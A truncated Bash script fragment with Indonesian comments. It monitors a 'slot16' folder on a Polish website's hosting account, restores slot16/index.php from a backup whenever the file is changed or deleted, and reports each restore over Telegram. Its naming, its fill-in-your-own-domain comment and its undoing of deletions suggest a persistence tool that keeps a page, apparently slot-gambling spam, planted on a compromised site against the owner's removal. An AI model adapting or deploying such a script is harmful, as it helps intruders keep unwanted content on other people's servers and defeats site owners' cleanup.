...
MONITOR_FOLDER="/home2/poweritu/public_html/slot16"
# Definisikan lokasi file index.php Permissions 755
INDEX_FILE="/home2/poweritu/public_html/slot16/index.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home2/poweritu/logs"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/poweritup-logs"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "https://poweritup.pl/slot16/."
            send_telegram_notification "slot16/index.php Folder HAPUS. File https://poweritup.pl/slot16/index.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
